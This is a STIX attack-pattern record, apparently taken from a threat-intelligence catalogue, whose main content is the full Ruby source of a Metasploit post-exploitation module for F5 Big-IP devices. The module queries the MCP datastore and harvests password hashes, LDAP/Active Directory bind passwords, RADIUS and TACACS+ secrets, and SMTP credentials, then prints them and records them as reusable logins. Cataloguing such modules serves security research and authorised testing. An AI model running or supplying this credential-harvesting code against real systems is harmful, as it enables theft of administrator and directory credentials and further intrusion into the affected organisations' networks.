{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7adce610-e974-4234-8afa-1d09b8eca37e",
    "created": "2024-08-14T16:33:17.304795Z",
    "modified": "2024-08-14T16:33:17.304799Z",
    "name": "F5 Big-IP Gather Information from MCP Datastore",
    "description": " This module gathers various interesting pieces of data from F5's \"mcp\" datastore, which is accessed via /var/run/mcp using a proprietary protocol.  Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/f5_loot_mcp.rb",
            "external_id": "f5_loot_mcp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K97843387"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::F5Mcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 Big-IP Gather Information from MCP Datastore',\n        'Description' => %q{\n          This module gathers various interesting pieces of data from F5's\n          \"mcp\" datastore, which is accessed via /var/run/mcp using a\n          proprietary protocol.\n\n          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Ron Bowes'],\n        'Platform' => ['linux', 'unix'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'References' => [\n          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC\n          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],\n          ['URL', 'https://support.f5.com/csp/article/K97843387'],\n        ],\n        'DisclosureDate' => '2022-11-16',\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from MCP', true]),\n        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from MCP', true]),\n        OptBool.new('GATHER_DB_VARIABLES', [true, 'Gather database variables (warning: slow)', false]),\n      ]\n    )\n  end\n\n  def gather_hashes\n    print_status('Gathering users and password hashes from MCP')\n    users = mcp_simple_query('userdb_entry')\n\n    unless users\n      print_error('Failed to query users')\n      return\n    end\n\n    users.each do |u|\n      print_good(\"#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}\")\n\n      create_credential(\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),\n        origin_type: :session,\n        post_reference_name: refname,\n        private_type: :nonreplayable_hash,\n        private_data: u['userdb_entry_passwd'],\n        session_id: session_db_id,\n        username: u['userdb_entry_name'],\n        workspace_id: myworkspace_id\n      )\n    end\n  end\n\n  def gather_upstream_passwords\n    print_status('Gathering upstream passwords from MCP')\n\n    vprint_status('Trying to fetch LDAP / Active Directory configuration')\n    ldap_config = mcp_simple_query('auth_ldap_config') || []\n    ldap_config.select! { |config| config['auth_ldap_config_bind_pw'] }\n    if ldap_config.empty?\n      print_status('No LDAP / Active Directory password found')\n    else\n      ldap_config.each do |config|\n        config['auth_ldap_config_servers'].each do |server|\n          report_cred(\n            username: config['auth_ldap_config_bind_dn'],\n            password: config['auth_ldap_config_bind_pw'],\n            host: server,\n            port: config['auth_ldap_config_port'],\n            service_name: (config['auth_ldap_config_ssl'] == 1 ? 'ldaps' : 'ldap')\n          )\n        end\n      end\n    end\n\n    vprint_status('Trying to fetch Radius configuration')\n    radius_config = mcp_simple_query('radius_server') || []\n    radius_config.select! { |config| config['radius_server_secret'] }\n    if radius_config.empty?\n      print_status('No Radius password found')\n    else\n      radius_config.each do |config|\n        report_cred(\n          password: config['radius_server_secret'],\n          host: config['radius_server_server'],\n          port: config['radius_server_port'],\n          service_name: 'radius'\n        )\n      end\n    end\n\n    vprint_status('Trying to fetch TACACS+ configuration')\n    tacacs_config = mcp_simple_query('auth_tacacs_config') || []\n    tacacs_config.select! { |config| config['auth_tacacs_config_secret'] }\n    if tacacs_config.empty?\n      print_status('No TACACS+ password found')\n    else\n      tacacs_config.each do |config|\n        config['auth_tacacs_config_servers'].each do |server|\n          report_cred(\n            password: config['auth_tacacs_config_secret'],\n            host: server,\n            port: 49,\n            service_name: 'tacacs+'\n          )\n        end\n      end\n    end\n\n    vprint_status('Trying to fetch SMTP configuration')\n    smtp_config = mcp_simple_query('smtp_config') || []\n    smtp_config.select! { |config| config['smtp_config_username'] }\n    if smtp_config.empty?\n      print_status('No SMTP password found')\n    else\n      smtp_config.each do |config|\n        report_cred(\n          username: config['smtp_config_username'],\n          password: config['smtp_config_password'],\n          host: config['smtp_config_smtp_server_address'],\n          port: config['smtp_config_smtp_server_port'],\n          service_name: 'smtp'\n        )\n      end\n    end\n  end\n\n  def gather_db_variables\n    print_status('Fetching db variables from MCP (this takes a bit)...')\n    vars = mcp_simple_query('db_variable')\n\n    unless vars\n      print_error('Failed to query db variables')\n      return\n    end\n\n    vars.each do |v|\n      print_good \"#{v['db_variable_name']} => #{v['db_variable_value']}\"\n    end\n  end\n\n  def resolve_host(hostname)\n    ip = nil\n    if session.type == 'meterpreter' && session.commands.include?(Rex::Post::Meterpreter::Extensions::Stdapi::COMMAND_ID_STDAPI_NET_RESOLVE_HOST)\n      result = session.net.resolve.resolve_host(hostname)\n      ip = result[:ip] if result\n    else\n      result = cmd_exec(\"dig +short '#{hostname}'\")\n      ip = result.strip unless result.blank?\n    end\n\n    vprint_warning(\"Failed to resolve hostname: #{hostname}\") unless ip\n\n    ip\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(\"Failed to resolve hostname: #{hostname.inspect}\", error: e)\n  end\n\n  def report_cred(opts)\n    netloc = \"#{opts[:host]}:#{opts[:port]}\"\n    print_good(\"#{netloc.ljust(21)} - #{opts[:service_name]}: '#{opts[:username]}:#{opts[:password]}'\")\n\n    if opts[:host] && !Rex::Socket.is_ip_addr?(opts[:host])\n      opts[:host] = resolve_host(opts[:host])\n    end\n\n    service_data = {\n      address: opts[:host],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: opts.fetch(:protocol, 'tcp'),\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:username]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    gather_hashes if datastore['GATHER_HASHES']\n    gather_upstream_passwords if datastore['GATHER_SERVICE_PASSWORDS']\n    gather_db_variables if datastore['GATHER_DB_VARIABLES']\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-16",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}